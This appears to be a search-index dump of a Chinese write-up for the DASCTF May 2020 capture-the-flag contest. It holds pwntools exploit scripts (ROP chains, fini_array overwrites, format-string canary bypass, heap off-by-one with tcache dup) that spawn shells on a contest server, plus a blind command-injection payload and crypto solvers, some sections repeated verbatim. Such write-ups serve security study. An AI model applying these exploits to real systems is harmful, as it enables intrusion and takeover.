\u7a0b\u5e8f\u8fd8\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u5173\u95ed\u4e86\u8f93\u5165\u8bbe\u5907\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u8981\u4e00\u6b21\u6027\u5c31\u53ef\u4ee5\u83b7\u5f97flag\uff0c\u6211\u4eec\u4e3b\u8981\u5230\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26\u4e32cat/flag\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u62f7\u8d1d\u5230bss\u6bb5\uff0c\u5e76\u5c06/\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528system\u6765\u83b7\u5f97flag\u3002\u521a\u597d\u6211\u4eec\u6709memcpt\uff0cmemset\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u53bb\u63a7\u5236rdi\uff0crsi\uff0crdx\u4e09\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7a0b\u5e8f\u6ca1\u6709pop rdx\uff1bret\u8fd9\u6837\u7684gadget\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u5229\u7528libc_scu_init\u6765\u6267\u884c\u51fd\u6570\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\u7075\u6d3b\u7ec4\u5408payload\uff0c\u4e0d\u8981\u6d6a\u8d39\u4efb\u4f55\u4e00\u4e2a\u5b57\u8282\uff0c\u56e0\u4e3a\u7528libc_sct_init\u6765\u6267\u884c\u51fd\u6570\u7684\u8bdd\uff0c\u9700\u8981\u7684\u6ea2\u51fa\u7a7a\u95f4\u6bd4\u8f83\u5927\uff0c\u800c\u6211\u4eec\u53ea\u80fd\u6ea2\u51fa0x100-9\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8981\u597d\u597d\u7684\u7ec4\u5408\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \\x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . interactive () Memory Moster \u2161 \u00b6 \u5229\u7528\u7a0b\u5e8f\u4ecemain\u51fd\u6570\u7ed3\u675f\u540e\u4f1a\u8c03\u7528fini_array\u91cc\u9762\u7684\u51fd\u6570\uff0c\u6765\u6808\u8fc1\u79fb\u8fdb\u800c\u5199ROP\uff0c\u83b7\u53d6shell\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive () Memory Moster\u2162 \u00b6 \u539f\u7406\u548c\u4e0a\u4e00\u9898\u76f8\u540c\uff0cexp\u4e5f\u662f\u7c7b\u4f3c\uff0c\u53ea\u662fgadget\u6709\u4e00\u70b9\u533a\u522b\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive () easybabystack \u00b6 \u8fd9\u9053\u9898\u5229\u7528\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32*\u7684\u7279\u6027\u3002 *\u53ef\u4ee5\u7528\u53c2\u6570\u6765\u8ba1\u7b97\u5360\u4f4d\u7b26\u7684\u5bbd\u5ea6\u3002\u5982:%*2$c\uff0c\u5c31\u662f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u6765\u51b3\u5b9a\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u7684\u5bbd\u5ea6\u3002\u5229\u7528\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u5c31\u53ef\u4ee5\u8f93\u51fa\u548ccanary\u4e00\u6837\u5927\u5c0f\u7684\u5b57\u7b26\u8fdb\u800c\u7528%n\u4fee\u6539\u53d8\u91cf\u6765bypass\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()","title":"DASCTF2020-5\u6708\u8d5b"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#web","text":"","title":"Web"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#_1","text":"\u8003\u70b9\uff1a \u76f2\u6ce8 \u601d\u8def\uff1a cat /flag |grep 'BJD{xx' || sleep(2);","title":"\u5e2e\u5e2e\u5c0f\u7ea2\u82b1"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#misc","text":"","title":"Misc"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#baby_web","text":"\u8003\u70b9\uff1a\u96f6\u5bbd\u5ea6\u5b57\u7b26\u9690\u5199\u3001\u5404\u79cd\u5947\u602a\u5bc6\u7801 \u53c2\u8003\uff1a http://www.ga1axy.top/index.php/archives/20/ \u6709\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u5bc6\u7801\u5728html\u91cc\u9762\uff0c\u5173\u4e8e\u96f6\u5bbd\u5ea6\u5b57\u7b26\u7684\u53c2\u8003\u5728ga1axy\u5e08\u5085blog\uff08\u4e0a\u9762\uff09\uff0c\u89e3\u5bc6\u540e\u9700\u8981\u9006\u4e00\u4e0b\u56fe\u7247\u7684hex\uff0c\u811a\u672c\uff1a f = open ( 'f14g.png' , 'rb' ) . read () f2 = list ( f ) f3 = f2 [:: - 1 ] #print f3 f4 = '' . join ( f3 ) with open ( 'f1ag.png' , 'wb' ) as f : f . write ( f4 ) \u7136\u540e\u5728\u5bf9\u5e94\u7f51\u7ad9\u4e0a\u89e3\u5bc6\u5373\u53ef\u3002","title":"baby_web"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#bincat-2","text":"\u8003\u70b9\uff1a\u4e8c\u7ef4\u7801\u8f6c\u6362 \u6211\u662f\u76f4\u63a5\u628a\u56fe\u7247\u7528ste\u5904\u7406\u7136\u540e\u8c03\u5230\u5bf9\u6bd4\u5ea6\u6bd4\u8f83\u9ad8\u7684\u901a\u9053\u626b\u5373\u53ef\uff08\u9003","title":"bin/cat 2"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#questionnaire","text":"\u8003\u70b9\uff1a\u67e5\u6e90\u7801 \u7b7e\u5230\u9898\u4e0d\u8bf4\u4e86\uff0c\u7b54\u6848\u5728\u6e90\u7801\uff0c\u8fde\u63a5\u4e0b\u9762\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u5373\u53ef","title":"questionnaire"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#crypto","text":"","title":"Crypto"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#bbcrypto","text":"\u8003\u70b9\uff1a\u7b80\u5355\u52a0\u5bc6 \u901a\u8fc7\u5df2\u77e5\u5bc6\u6587\u548c\u90e8\u5206\u660e\u6587\u679a\u4e3e\u51faa\u548csalt\uff0c\u7136\u540e\u901a\u8fc7\u5bc6\u6587\u679a\u4e3eflag\u503c\uff08\u811a\u672c\u5199\u7684\u592a\u8fa3\u9e21\u4e86\uff0c\u8f7b\u55b7 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = \"\" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag ))","title":"bbcrypto"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#easylcg","text":"\u8003\u70b9\uff1aLCG\u7b80\u5355\u5229\u7528 \u6bd4\u8f83\u7b80\u5355\u7684LCG\uff0c\u901a\u8fc7output\u679a\u4e3e\u51fas1\uff0c\u7136\u540e\u901a\u8fc7s1\u6c42\u51fas2\uff0c\u8fdb\u800cs3\u4e5f\u80fd\u88ab\u9884\u6d4b\uff1a from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 \u7136\u540e\u6539\u4e00\u4e0b\u52a0\u5bc6\u811a\u672c\u5c31\u80fd\u6c42\u51fakey\uff1a from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 )","title":"easyLCG"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#pwn","text":"","title":"pwn"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#taqinioj-0-100","text":"\u7a0b\u5e8f\u6a21\u62df\u4e86c\u8bed\u8a00\u7f16\u8bd1\u5668\uff0c\u4f46\u662f\u5bf9\u8f93\u5165c\u4ee3\u7801\u8fdb\u884c\u4e86\u654f\u611f\u5b57\u7b26\u8fc7\u6ee4\u53ef\u4ee5\u5229\u7528\u5b57\u7b26\u62fc\u63a5\uff0c\u5f02\u6216\u64cd\u4f5c\u7b49\u4f7f\u654f\u611f\u5b57\u7b26\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u5f97\u5230\u800c\u4e0d\u662f\u5728\u5c06\u5176\u8f93\u5165\u5230c\u4ee3\u7801\u4e2d\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]=\"/hom\"; char a[]=\"e/ct\"; char b[]=\"f/fl\"; char c[2]=\"ag\"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(\" %s \",name); FILE * fd=fopen(name,\"r\"); if(fd==-1) { printf(\"error\"); return 0; } fread(ff,1,0x100,fd); printf(\" %s \",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () \u8fd9\u4e2a\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3 #include '/home/ctf/fl\\ ag' \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u7528\u6765\u505aTaQiniOJ-1","title":"TaQiniOJ-0 - 100"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#memory-moster-i","text":"\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6709Canary\u4fdd\u62a4\uff0c\u6240\u4ee5\u53ef\u4ee5\u52ab\u6301__stack_chk_fail\u51fd\u6570\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \\x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive ()","title":"Memory Moster \u2160"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#happyending","text":"libc2.29\u4e0b\u7684off_by_one\uff0c\u9700\u8981\u7ed5\u8fc7presize\u548cunlink\u68c0\u6d4b\uff0c\u4f46\u662f\u6ca1\u6709\u529e\u6cd5\u6cc4\u6f0fheap\u7684\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u7075\u6d3b\u7684\u5229\u7528largbin\uff0csmallbin fastbin\u6b8b\u7559\u7684\u6570\u636e\u6765bypass\u524d\u9762\u7684\u68c0\u6d4b\uff0c\u8fdb\u800c\u5229\u7528off_by_one\u5b8c\u6210\u5bf9\u5408\u5e76\u5b9e\u73b0chunk overlapping\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528tcache_dup\u6765\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5206\u914d\u7684\u76ee\u7684\uff0c\u4fee\u6539__malloc_hook\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \\x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \\n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \\x00 ' ) . ljust ( 8 , ' \\x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive ()","title":"happyending"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#secret2","text":"\u6bcf\u5faa\u73af\u4e00\u6b21\u90fd\u4f1a\u6253\u5f00\u4e00\u6b21\u8bbe\u5907\uff0c\u800clinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u8bbe\u5907\uff0c\u6240\u4ee5\u5f53\u6253\u5f00\u8d85\u8fc71024\u4ee5\u540e\uff0c\u5c06\u4f1a\u6253\u5f00\u5931\u8d25\uff0c\u800c\u8bfb\u53d6\u6253\u5f00\u5931\u8d25\u7684\u6587\u4ef6\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u5c06\u4f1a\u662f\u96f6\u3002 \u7a0b\u5e8f\u8fd8\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u5173\u95ed\u4e86\u8f93\u5165\u8bbe\u5907\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u8981\u4e00\u6b21\u6027\u5c31\u53ef\u4ee5\u83b7\u5f97flag\uff0c\u6211\u4eec\u4e3b\u8981\u5230\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26\u4e32cat/flag\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u62f7\u8d1d\u5230bss\u6bb5\uff0c\u5e76\u5c06/\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528system\u6765\u83b7\u5f97flag\u3002\u521a\u597d\u6211\u4eec\u6709memcpt\uff0cmemset\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u53bb\u63a7\u5236rdi\uff0crsi\uff0crdx\u4e09\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7a0b\u5e8f\u6ca1\u6709pop rdx\uff1bret\u8fd9\u6837\u7684gadget\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u5229\u7528libc_scu_init\u6765\u6267\u884c\u51fd\u6570\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\u7075\u6d3b\u7ec4\u5408payload\uff0c\u4e0d\u8981\u6d6a\u8d39\u4efb\u4f55\u4e00\u4e2a\u5b57\u8282\uff0c\u56e0\u4e3a\u7528libc_sct_init\u6765\u6267\u884c\u51fd\u6570\u7684\u8bdd\uff0c\u9700\u8981\u7684\u6ea2\u51fa\u7a7a\u95f4\u6bd4\u8f83\u5927\uff0c\u800c\u6211\u4eec\u53ea\u80fd\u6ea2\u51fa0x100-9\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8981\u597d\u597d\u7684\u7ec4\u5408\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \\x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . interactive ()","title":"Secret2"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#memory-moster-ii","text":"\u5229\u7528\u7a0b\u5e8f\u4ecemain\u51fd\u6570\u7ed3\u675f\u540e\u4f1a\u8c03\u7528fini_array\u91cc\u9762\u7684\u51fd\u6570\uff0c\u6765\u6808\u8fc1\u79fb\u8fdb\u800c\u5199ROP\uff0c\u83b7\u53d6shell\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"Memory Moster 